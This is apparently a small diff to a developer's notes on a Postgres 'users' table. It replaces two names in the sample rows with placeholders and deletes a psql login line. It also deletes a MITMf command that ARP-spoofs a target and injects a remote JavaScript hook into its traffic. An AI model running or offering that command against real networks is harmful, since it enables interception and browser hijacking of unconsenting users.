@@ -1,5 +1,3 @@
-sudo -i -u python_dev psql python_api_dev_db
-
 users
 
 CREATE TABLE users(
@@ -14,7 +12,5 @@ INSERT INTO users (name, caller_id)
 ----+--------+-----------
  id |  name  | caller_id 
 ----+--------+-----------
-  1 | Elijah | 328444834
-  2 | Nejc   | 807154043
-
-python mitmf.py --spoof --arp -i <interface> --gateway <router IP> --target <target IP> --inject --js-url <hook.js URL>
+  1 | Name1  | 328444834
+  2 | Name2  | 807154043
